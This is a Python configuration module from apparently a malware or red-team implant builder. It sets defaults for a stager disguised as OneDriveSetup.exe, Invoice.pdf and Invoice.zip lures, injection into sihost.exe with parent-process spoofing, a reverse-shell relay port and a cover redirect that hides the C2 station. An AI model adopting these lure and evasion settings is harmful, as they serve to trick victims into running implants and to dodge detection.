# bab/config.py — paths, default config, persistence, validators, display/edit

import json
import os
import tempfile
from pathlib import Path

from .ui import section, ok, err, info, prompt, cyan, grey


def _random_hex(n: int) -> str:
    return os.urandom(n).hex()[:n]

# ── Paths ─────────────────────────────────────────────────────────────────────────
HERE        = Path(__file__).parent.parent.resolve()
ROOT        = HERE.parent
CONFIG_FILE = HERE / "build_config.json"
BUILD_DIR   = Path(tempfile.gettempdir()) / "rizzbuild"
IMPLANT_OUT = ROOT / "backdoors" / "implant"

DEFAULT_CONFIG = {
    # Implant crypto — auto-generated on first run
    "key":             "",
    "iv":              "",
    "imp_id":          "TargetOp2025",
    # Station — all URLs derive from this base; implant beacons here
    "station":         "http://127.0.0.1",
    # stager_url is derived: station + "/backdoors/stagers/" + stager_filename
    "stager_url":      "http://127.0.0.1/backdoors/stagers/OneDriveSetup.exe",
    # C2 server — what the station calls back to (ThornC2). Separate from station URL.
    "c2_url":          "http://127.0.0.1",
    # Relay port on the station for TCP reverse shells
    "relay_port":      4444,
    # Cover redirect — non-beacon traffic gets 301'd here
    "cover_redirect":  "https://www.microsoft.com",
    # Payload filenames
    "stager_filename": "OneDriveSetup.exe",
    "implant_filename": "ActivityReport",
    # Stager
    "stager_name":     "invoice",
    "stager_output":   "backdoors/stagers",
    # LNK
    "lnk_name":        "Invoice.pdf",
    "lnk_fake_path":   r"C:\Users\Public\Documents\Invoice.pdf",
    "lnk_icon":        r"%WINDIR%\System32\shell32.dll",
    "lnk_icon_index":  45,
    "lnk_type":        "SPOOFEXE_HIDEARGS_DISABLETARGET",
    "lnk_output_dir":  "backdoors/stagers",
    "lnk_tool_path":   "tools/lnk-it-up",
    # ZIP embed
    "zip_stager_name": "OneDriveSetup.exe",
    "zip_filename":    "Invoice.zip",
    # Stager injection
    "stager_inject_target": r"C:\Windows\System32\sihost.exe",
    "stager_ppid_proc":     "explorer.exe",
    "component_stager_inject": "module_stomp",
    "component_stager_crypto": "aes_256_cbc",
    # Build location — "server" (default, POSTs to /api/build) or "local"
    # (runs cargo in-process on this machine; requires Rust toolchain).
    "build_location":       "server",
}

# ── Persistence ───────────────────────────────────────────────────────────────────
def load_config() -> dict:
    if CONFIG_FILE.exists():
        try:
            cfg = json.loads(CONFIG_FILE.read_text())
            # Back-compat: keep url in sync with station
            if "url" not in cfg:
                cfg["url"] = cfg.get("station", "http://127.0.0.1")
            return cfg
        except Exception:
            pass
    cfg = dict(DEFAULT_CONFIG)
    cfg["key"] = _random_hex(32)
    cfg["iv"]  = _random_hex(16)
    cfg["url"] = cfg["station"]
    return cfg

def save_config(cfg: dict):
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2))

def resolve_dir(path_str: str) -> Path:
    """Resolve an output directory path relative to ROOT if not absolute."""
    p = Path(path_str)
    return p if p.is_absolute() else ROOT / p

# ── Validators ───────────────────────────────────────────────────────────────────
def validate_key(v: str):
    if len(v) > 32:
        return f"Key too long ({len(v)} bytes, max 32)"
    if len(v) < 8:
        return "Key too short (min 8 bytes recommended)"
    return True

def validate_iv(v: str):
    if len(v) > 16:
        return f"IV too long ({len(v)} bytes, max 16)"
    if len(v) < 8:
        return "IV too short (min 8 bytes recommended)"
    return True

def validate_url(v: str):
    if len(v) >= 256:
        return f"URL too long ({len(v)} bytes, max 255)"
    if not v.startswith(("http://", "https://")):
        return "URL must start with http:// or https://"
    return True

def validate_imp_id(v: str):
    if len(v) >= 64:
        return f"Implant ID too long ({len(v)} bytes, max 63)"
    return True

# ── Display / edit ────────────────────────────────────────────────────────────────
def _station_base(cfg: dict) -> str:
    return cfg.get("station", cfg.get("url", "http://127.0.0.1")).rstrip("/")

def show_config(cfg: dict):
    section("Current Configuration")
    station = _station_base(cfg)
    stager_url = station + "/backdoors/stagers/" + cfg.get("stager_filename", "OneDriveSetup.exe")
    fields = [
        ("Station",      station,                        "Implant beacons here (Station)"),
        ("Key",          cfg["key"],                     f"{len(cfg['key'])} / 32 bytes"),
        ("IV",           cfg["iv"],                      f"{len(cfg['iv'])} / 16 bytes"),
        ("Implant ID",   cfg["imp_id"],                  "Unique Implant name per engagement"),
        ("C2 URL",       cfg.get("c2_url", station),     "Station calls back here (ThornC2)"),
        ("Relay Port",   str(cfg.get("relay_port", 4444)), "TCP relay for reverse shells"),
        ("Cover Redirect", cfg.get("cover_redirect", "https://www.microsoft.com"), "Non-beacon traffic redirect"),
        ("Stager File",  cfg.get("stager_filename", "OneDriveSetup.exe"), "Stager filename output"),
        ("Stager URL",   stager_url,                     "Derived from station + stager filename"),
        ("Implant File", cfg.get("implant_filename", "ActivityReport"), "Implant filename output"),
        ("ZIP Filename",    cfg.get("zip_filename",         "Invoice.zip"),                          "ZIP filename output"),
        ("ZIP Stager",      cfg.get("zip_stager_name",      "OneDriveSetup.exe"),                    "Stager filename inside ZIP"),
        ("Inject Target",   cfg.get("stager_inject_target", r"C:\Windows\System32\sihost.exe"),      "Process spawned for injection"),
        ("PPID Spoof",      cfg.get("stager_ppid_proc",     "explorer.exe"),                         "Process to spoof as parent"),
        ("Build Location",  cfg.get("build_location",       "server"),                               "local = cargo on this machine; server = C2 build queue"),
    ]
    for name, val, note in fields:
        note_str = f"  {grey(note)}" if note else ""
        print(f"    {cyan(name + ':'): <22} {val}{note_str}")

def edit_config(cfg: dict) -> dict:
    section("Edit Configuration")
    print(grey("  Press Enter to keep the current value.\n"))

    cur_station = _station_base(cfg)
    new_station = prompt("Station base URL        ", cur_station, validate_url)
    cfg["station"] = new_station
    cfg["url"]     = new_station

    if not cfg.get("key") or not cfg.get("iv"):
        cfg["key"] = _random_hex(32)
        cfg["iv"]  = _random_hex(16)
        info(f"Generated Key: {cfg['key']}")
        info(f"Generated IV:  {cfg['iv']}")
    regen = prompt("Regenerate Key/IV?  (y/N)", "N")
    if regen.strip().lower() in ("y", "yes"):
        cfg["key"] = _random_hex(32)
        cfg["iv"]  = _random_hex(16)
        info(f"New Key: {cfg['key']}")
        info(f"New IV:  {cfg['iv']}")

    cfg["imp_id"] = prompt("Implant ID              ", cfg["imp_id"], validate_imp_id)

    print(grey("\n  Override individual URLs (or press Enter to keep):"))
    cfg["c2_url"]     = prompt("C2 URL       (→ ThornC2) ", cfg.get("c2_url", cfg["url"]), validate_url)
    relay_str = prompt("Relay port   (TCP shells) ", str(cfg.get("relay_port", 4444)), lambda v: True if v.isdigit() else "Port must be a number")
    cfg["relay_port"] = int(relay_str)
    cfg["cover_redirect"] = prompt("Cover redirect URL      ", cfg.get("cover_redirect", "https://www.microsoft.com"), validate_url)

    print(grey("\n  Payload filenames:"))
    cfg["stager_filename"]  = prompt("Stager filename         ", cfg.get("stager_filename",  "OneDriveSetup.exe"))
    cfg["implant_filename"] = prompt("Implant filename        ", cfg.get("implant_filename", "ActivityReport"))
    cfg["stager_url"] = cfg["station"].rstrip("/") + "/backdoors/stagers/" + cfg["stager_filename"]

    print(grey("\n  ZIP packaging:"))
    cfg["zip_filename"]    = prompt("ZIP output filename     ", cfg.get("zip_filename",    "Invoice.zip"))
    cfg["zip_stager_name"] = prompt("Stager name inside ZIP  ", cfg.get("zip_stager_name", "OneDriveSetup.exe"))

    print(grey("\n  Stager injection:"))
    cfg["stager_inject_target"] = prompt("Inject target process   ", cfg.get("stager_inject_target", r"C:\Windows\System32\sihost.exe"))
    cfg["stager_ppid_proc"]     = prompt("PPID spoof process      ", cfg.get("stager_ppid_proc",     "explorer.exe"))


    save_config(cfg)
    ok("Configuration saved to build_config.json")
    return cfg
